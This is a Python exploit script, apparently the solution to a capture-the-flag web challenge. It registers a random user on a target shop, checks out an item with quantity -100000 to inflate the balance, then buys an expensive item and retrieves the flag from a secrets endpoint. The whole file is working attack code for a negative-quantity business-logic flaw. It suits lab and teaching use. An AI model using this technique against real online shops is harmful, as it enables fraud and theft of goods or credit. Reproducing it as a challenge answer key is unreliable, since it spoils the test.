#!/usr/bin/env python3

import string
import random
import requests
import sys
import os
from dotenv import load_dotenv


load_dotenv()
PORT = os.getenv('PORT')

if len(sys.argv) < 2:
    print(f'Usage: {sys.argv[0]} <target>')
    sys.exit(1)

target = sys.argv[1]
base_url = f"http://{target}:{PORT}"

print(f"[*] Exploiting {base_url}")
print("[*] Vulnerability: Negative quantity allows unlimited money")
print()

# Register exploit user
username = ''.join(random.choice(string.ascii_letters) for _ in range(12))
password = ''.join(random.choice(string.ascii_letters) for _ in range(12))

session = requests.Session()

print(f"[+] Registering user: {username}")
resp = session.post(f"{base_url}/register", data={
    'username': username,
    'password': password
})

if resp.status_code != 200:
    print("[!] Registration failed")
    sys.exit(1)

print("[*] Step 1: Add mouse to cart")

# Add mouse to cart
resp = session.post(f"{base_url}/add_to_cart", data={
    'item_id': 'mouse'
})

if resp.status_code != 200 or not resp.json().get('success'):
    print("[!] Failed to add to cart")
    sys.exit(1)

print("[+] Mouse added to cart")
print()
print("[*] Step 2: Checkout with quantity -100000")

resp = session.post(f"{base_url}/checkout", data={
    'quantity_mouse': '-100000'
})

if resp.status_code == 200 and resp.json().get('success'):
    new_balance = resp.json().get('new_balance')
    print(f"[+] SUCCESS! New balance: {new_balance} credits")
else:
    print("[!] Exploit failed")
    print(f"[!] Response: {resp.text}")
    sys.exit(1)

print()
print("[+] Now we have enough money to buy catnip (999999 credits)")

print("[+] Adding 'catnip' to cart...")
resp = session.post(f"{base_url}/add_to_cart", data={
    'item_id': 'catnip'
})

if resp.status_code != 200 or not resp.json().get('success'):
    print("[!] Failed to add catnip to cart")
    sys.exit(1)

print("[+] Checking out catnip with quantity 1...")
resp = session.post(f"{base_url}/checkout", data={
    'quantity_catnip': '1'
})

if resp.status_code != 200 or not resp.json().get('success'):
    print("[!] Failed to buy catnip")
    sys.exit(1)

print("[+] Catnip purchased!")

print("[+] Retrieving flag from secrets...")
resp = session.get(f"{base_url}/get_secrets", params={
    'item_id': 'catnip'
})

if resp.status_code == 200:
    data = resp.json()
    if data.get('success'):
        secrets = data.get('secrets', [])
        if secrets:
            print()
            print("="*60)
            print("[+] FLAG CAPTURED:")
            for secret in secrets:
                print(f"    {secret}")
            print("="*60)
        else:
            print("[!] No secrets found")
    else:
        print("[!] Failed to get secrets")
else:
    print("[!] Request failed")

print()
print("[+] Exploit complete!")
